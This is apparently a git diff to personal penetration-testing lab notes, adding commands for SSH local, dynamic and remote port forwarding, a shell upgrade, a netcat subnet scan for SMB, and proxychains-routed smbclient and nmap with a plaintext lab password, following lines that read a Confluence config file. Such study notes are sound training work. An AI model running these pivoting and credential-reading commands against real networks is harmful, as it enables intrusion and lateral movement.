@@ -118,3 +118,20 @@ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
 socat -ddd TCP-LISTEN:2345,fork TCP:10.4.216.215:5432
 psql -h 192.168.50.63 -p 2345 -U postgres
 ```
+### SSH Tunneling
+> **-D** is for Dynamic, that's why only argument is put into the command, because we wait for every connection (not a precise one)
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+ss -ntplu
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+cat /etc/proxychains4.conf                                                          \\\\ This is the config file for "proxychain"
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234        \\\\ Same request as the last section, but with proxychain (for Dynamic tunneling)
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217                          \\\\ Nmap request with "proxychain"
+```
+#### SSH Remote Port Forwarding
+```
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4                        \\\\ "Bind shell" like port forwarding
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
